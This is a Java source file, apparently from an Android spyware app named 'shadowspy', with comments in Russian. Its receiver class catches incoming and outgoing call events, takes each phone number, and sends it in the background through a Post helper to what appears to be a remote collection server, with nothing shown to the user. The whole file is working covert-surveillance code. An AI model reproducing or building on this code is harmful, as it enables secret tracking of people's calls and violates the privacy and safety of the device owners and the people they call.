package com.example.shadowspy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

public class OutcomingCallMonitor extends BroadcastReceiver {
	private final String action = "android.intent.action.NEW_OUTGOING_CALL";
	private String phoneNumber = "";
	private Post post;
	@Override
    public void onReceive(Context context, Intent intent) {
		post = new Post(context);
		
        if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
            //получаем исходящий номер
            phoneNumber = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
            ProcessOutCall(phoneNumber);
            Log.w("newCall", phoneNumber+ " NEW_OUTGOING_CALL");
        } else if (intent.getAction().equals("android.intent.action.PHONE_STATE")){
            String phone_state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (phone_state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                //телефон звонит, получаем входящий номер
                phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                ProcessInCall(phoneNumber);
            } else if (phone_state.equals(TelephonyManager.EXTRA_STATE_IDLE)){
                //телефон находиться в ждущем режиме. Это событие наступает по окончанию разговора, когда мы уже знаем номер и факт звонка
            	ProcessFinishCall(phoneNumber);
            	Log.w("newCall", " EXTRA_STATE_IDLE");
            }
        }
    }
	
	private void ProcessInCall(final String phoneNumber){
		new Thread(new Runnable() {
		    public void run() {
		    	String msg = Codes.START_INCOMING_CALL + "#" + phoneNumber;	
				String result = post.SendMessage(msg);
				Log.v("incomingCall", result);
		    }//run()
		}).start();	
	}
	
	private void ProcessOutCall(final String phoneNumber){
		new Thread(new Runnable() {
		    public void run() {
		    	String msg = Codes.START_OUTCOMING_CALL + "#" + phoneNumber;	
				String result = post.SendMessage(msg);
				Log.v("incomingCall", result);
		    }//run()
		}).start();	
	}
	
	private void ProcessFinishCall(final String phoneNumber){
		new Thread(new Runnable() {
		    public void run() {
		    	String msg = Codes.STOP_CALL + "#" + phoneNumber;	
				String result = post.SendMessage(msg);
				Log.v("incomingCall", result);
		    }//run()
		}).start();	
	}
	
	
}
